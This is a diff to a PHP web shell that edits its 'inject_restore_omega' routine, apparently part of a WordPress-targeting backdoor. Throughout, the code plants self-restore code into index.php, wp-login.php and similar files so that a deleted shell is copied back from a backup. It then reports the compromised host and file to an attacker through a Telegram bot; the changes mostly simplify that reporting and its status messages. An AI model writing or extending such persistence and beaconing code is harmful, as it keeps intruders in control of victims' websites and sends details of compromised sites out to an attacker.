@@ -377,9 +377,6 @@ function sendJsonResponse($data) {
     exit;
 }
 
-// ============================================================
-// INJECT RESTORE - OMEGA EDITION (FIXED)
-// ============================================================
 
 function inject_restore_omega() {
     global $CURRENT_SHELL, $botToken, $telegramUserId;
@@ -388,6 +385,7 @@ function inject_restore_omega() {
         $CURRENT_SHELL = basename(__FILE__);
     }
     
+    // Target files
     $targetFiles = [
         __DIR__ . '/index.php',
         __DIR__ . '/wp-login.php',
@@ -401,6 +399,7 @@ function inject_restore_omega() {
     $hash = md5($CURRENT_SHELL . __DIR__);
     $funcName = 'omega_restore_' . $hash;
     
+    // Kode restore untuk diinject
     $restoreCode = "\n// ===== OMEGA AUTO RESTORE =====\n";
     $restoreCode .= "if (!function_exists('" . $funcName . "')) {\n";
     $restoreCode .= "    function " . $funcName . "() {\n";
@@ -416,10 +415,7 @@ function inject_restore_omega() {
     $restoreCode .= "                if (file_exists(\$backup)) {\n";
     $restoreCode .= "                    @copy(\$backup, __DIR__ . '/' . \$current_file);\n";
     $restoreCode .= "                    @chmod(__DIR__ . '/' . \$current_file, 0644);\n";
-    $restoreCode .= "                    \$domain = \$_SERVER['HTTP_HOST'] ?? 'localhost';\n";
-    $restoreCode .= "                    \$protocol = (isset(\$_SERVER['HTTPS']) ? 'https://' : 'http://');\n";
-    $restoreCode .= "                    \$url = \$protocol . \$domain . '/' . \$current_file;\n";
-    $restoreCode .= "                    @file_get_contents('https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $telegramUserId . "&text=' . urlencode('RESTORED: ' . \$url));\n";
+    $restoreCode .= "                    @file_get_contents('https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $telegramUserId . "&text=' . urlencode('RESTORED: ' . \$_SERVER['HTTP_HOST'] . '/' . \$current_file));\n";
     $restoreCode .= "                    break;\n";
     $restoreCode .= "                }\n";
     $restoreCode .= "            }\n";
@@ -440,7 +436,7 @@ function inject_restore_omega() {
     
     foreach ($targetFiles as $file) {
         if (!file_exists($file)) {
-            $errors[] = basename($file) . " (file not found)";
+            $errors[] = basename($file) . " (not found)";
             continue;
         }
         if (!is_writable($file)) {
@@ -458,7 +454,7 @@ function inject_restore_omega() {
         }
         
         if (strpos($content, $funcName) !== false) {
-            $exists[] = basename($file) . " (already injected)";
+            $exists[] = basename($file) . " (already)";
             continue;
         }
         
@@ -472,7 +468,7 @@ function inject_restore_omega() {
             $injected[] = basename($file);
             @chmod($file, 0644);
         } else {
-            $errors[] = basename($file) . " (failed to write)";
+            $errors[] = basename($file) . " (failed)";
         }
     }
     
@@ -482,11 +478,9 @@ function inject_restore_omega() {
         @chmod($mainBackup, 0444);
     }
     
-    // Kirim notifikasi simple ke Telegram
-    $fileInfo = get_file_location();
-    $url = $fileInfo['url'] ?? 'unknown';
-    $simpleMsg = "RESTORED: " . $url;
-    sendTelegramMessage($botToken, $telegramUserId, $simpleMsg);
+    // Kirim notifikasi SIMPLE ke Telegram
+    $url = $_SERVER['HTTP_HOST'] . '/' . $CURRENT_SHELL;
+    sendTelegramMessage($botToken, $telegramUserId, "RESTORED: " . $url);
     
     return [
         'status' => count($injected) > 0 ? 'success' : 'warning',
